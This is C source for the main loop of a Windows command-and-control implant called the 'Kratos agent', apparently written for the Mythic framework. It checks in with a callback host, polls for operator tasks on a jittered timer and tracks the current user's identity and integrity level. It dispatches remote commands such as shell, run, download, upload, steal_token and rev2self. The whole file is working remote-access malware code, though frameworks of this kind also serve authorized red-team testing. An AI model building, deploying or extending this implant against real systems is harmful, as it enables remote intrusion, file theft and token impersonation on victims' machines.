#define _WIN32_WINNT 0x0600
#include "Checkin.h"
#include "commands.h"
#include "config.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

#ifndef SLEEP_TIME
#define SLEEP_TIME 5
#endif

#ifndef CALLBACK_JITTER
#define CALLBACK_JITTER 0
#endif

// Globals
char current_uuid[128];
char last_sent_user[512] = {0}; // Track reported identity to trigger updates
int current_sleep_time = SLEEP_TIME * 1000; // Convert seconds to milliseconds
int current_jitter = CALLBACK_JITTER;

#ifndef UUID
// #define AGENT_UUID "..."
#endif

// Debug Macro (duplicated from utils.c for now, or move to common header)
#if DEBUG
#define DEBUG_PRINT(...)                                                       \
  do {                                                                         \
    fprintf(stdout, "[DEBUG] ");                                               \
    fprintf(stdout, __VA_ARGS__);                                              \
    fprintf(stdout, "\n");                                                     \
    fflush(stdout);                                                            \
  } while (0)
#else
#define DEBUG_PRINT(...)                                                       \
  do {                                                                         \
  } while (0)
#endif

int main() {

  srand((unsigned int)time(NULL));
  strncpy(current_uuid, AGENT_UUID, sizeof(current_uuid) - 1);
  current_uuid[sizeof(current_uuid) - 1] = '\0';

  DEBUG_PRINT("Kratos agent started.");
  DEBUG_PRINT("UUID: %s", current_uuid);
  DEBUG_PRINT("Target: %s:%d/%s", CALLBACK_HOST, CALLBACK_PORT, POST_URI);
#if defined(KRATOS_AESPSK) && defined(USE_TINY_AES)
  DEBUG_PRINT("Crypto: AES-256-CBC / tiny-AES backend (no bcrypt.dll)");
#elif defined(KRATOS_AESPSK) && defined(USE_BCRYPT)
  DEBUG_PRINT("Crypto: AES-256-CBC / BCrypt backend");
#else
  DEBUG_PRINT("Crypto: plaintext");
#endif

  while (1) {
    // Checkin Logic
    if (strncmp(current_uuid, AGENT_UUID, 36) == 0) {
      if (CheckinSend(NULL)) {
        DEBUG_PRINT("Checkin successful. UUID updated to: %s", current_uuid);
      } else {
        DEBUG_PRINT("Checkin failed/retrying...");
      }
    } else {
      // Get Tasking
      char json_msg[4096];
      char display_user[512] = {0};
      get_current_display_user(display_user, sizeof(display_user));
      int integrity = get_integrity_level();

      // Force update if user changed
      if (strcmp(display_user, last_sent_user) != 0) {
        DEBUG_PRINT("Identity change detected (%s). Triggering update...",
                    display_user);
        CheckinSend(display_user);
        strncpy(last_sent_user, display_user, sizeof(last_sent_user) - 1);
      }

      char *escaped_user = json_escape(display_user);
      snprintf(json_msg, sizeof(json_msg),
               "{\"action\": \"get_tasking\", \"tasking_size\": -1, \"uuid\": "
               "\"%s\", \"user\": \"%s\", \"integrity_level\": %d}",
               current_uuid, escaped_user, integrity);
      free(escaped_user);

      char *b64_resp = send_c2_message(json_msg);

      if (b64_resp && strlen(b64_resp) > 0) {
        char *json_resp = process_mythic_response(b64_resp, strlen(b64_resp));

        if (json_resp) {
          DEBUG_PRINT("Response JSON: %.100s...", json_resp);
          // ... tasks parsing ...

          char *tasks_ptr = strstr(json_resp, "\"tasks\"");
          if (tasks_ptr) {
            // ... process tasks ...
            char *cmd_local_ptr = tasks_ptr;
            while ((cmd_local_ptr = strstr(cmd_local_ptr, "\"command\""))) {
              char cmd_name[32] = {0};
              extract_json_string(cmd_local_ptr, "command", cmd_name,
                                  sizeof(cmd_name));
              char task_id[64] = {0};
              extract_json_string(cmd_local_ptr, "id", task_id,
                                  sizeof(task_id));
              char params[2048] = {0};
              extract_json_string(cmd_local_ptr, "parameters", params,
                                  sizeof(params));

              if (strlen(cmd_name) > 0) {
                printf("Processing task: %s (ID: %s)\n", cmd_name, task_id);
                if (0) {
                }
#ifdef INCLUDE_CMD_SHELL
                else if (strcmp(cmd_name, "shell") == 0)
                  command_shell(task_id, params);
#endif
#ifdef INCLUDE_CMD_RUN
                else if (strcmp(cmd_name, "run") == 0)
                  command_run(task_id, params);
#endif
#ifdef INCLUDE_CMD_GETUID
                else if (strcmp(cmd_name, "getuid") == 0)
                  command_getuid(task_id, params);
#endif
#ifdef INCLUDE_CMD_PWD
                else if (strcmp(cmd_name, "pwd") == 0)
                  command_pwd(task_id, params);
#endif
#ifdef INCLUDE_CMD_CD
                else if (strcmp(cmd_name, "cd") == 0)
                  command_cd(task_id, params);
#endif
#ifdef INCLUDE_CMD_LS
                else if (strcmp(cmd_name, "ls") == 0)
                  command_ls(task_id, params);
#endif
#ifdef INCLUDE_CMD_SLEEP
                else if (strcmp(cmd_name, "sleep") == 0)
                  command_sleep(task_id, params);
#endif
#ifdef INCLUDE_CMD_EXIT
                else if (strcmp(cmd_name, "exit") == 0)
                  command_exit(task_id, params);
#endif
#ifdef INCLUDE_CMD_CAT
                else if (strcmp(cmd_name, "cat") == 0)
                  command_cat(task_id, params);
#endif
#ifdef INCLUDE_CMD_CP
                else if (strcmp(cmd_name, "cp") == 0)
                  command_cp(task_id, params);
#endif
#ifdef INCLUDE_CMD_MV
                else if (strcmp(cmd_name, "mv") == 0)
                  command_mv(task_id, params);
#endif
#ifdef INCLUDE_CMD_RM
                else if (strcmp(cmd_name, "rm") == 0)
                  command_rm(task_id, params);
#endif
#ifdef INCLUDE_CMD_MKDIR
                else if (strcmp(cmd_name, "mkdir") == 0)
                  command_mkdir(task_id, params);
#endif
#ifdef INCLUDE_CMD_PS
                else if (strcmp(cmd_name, "ps") == 0)
                  command_ps(task_id, params);
#endif
#ifdef INCLUDE_CMD_KILL
                else if (strcmp(cmd_name, "kill") == 0)
                  command_kill(task_id, params);
#endif
#ifdef INCLUDE_CMD_WHOAMI
                else if (strcmp(cmd_name, "whoami") == 0)
                  command_whoami(task_id, params);
#endif
#ifdef INCLUDE_CMD_IFCONFIG
                else if (strcmp(cmd_name, "ifconfig") == 0)
                  command_ifconfig(task_id, params);
#endif
#ifdef INCLUDE_CMD_DOWNLOAD
                else if (strcmp(cmd_name, "download") == 0)
                  command_download(task_id, params);
#endif
#ifdef INCLUDE_CMD_UPLOAD
                else if (strcmp(cmd_name, "upload") == 0)
                  command_upload(task_id, params);
#endif
#ifdef INCLUDE_CMD_STEAL_TOKEN
                else if (strcmp(cmd_name, "steal_token") == 0)
                  command_steal_token(task_id, params);
#endif
#ifdef INCLUDE_CMD_REV2SELF
                else if (strcmp(cmd_name, "rev2self") == 0)
                  command_rev2self(task_id, params);
#endif
              }
              cmd_local_ptr += 1;
            }
          }
          free(json_resp);
        }
        free(b64_resp);
      }
    }
    // Caluler le délai avec jitter
    int final_sleep = current_sleep_time;
    if (current_jitter > 0) {
      int jitter_range = (current_sleep_time * current_jitter) / 100;
      if (jitter_range > 0) {
        int offset = (rand() % (jitter_range * 2 + 1)) - jitter_range;
        final_sleep += offset;
      }
    }
    if (final_sleep < 0)
      final_sleep = 0;

    Sleep(final_sleep);
  }
  return 0;
}
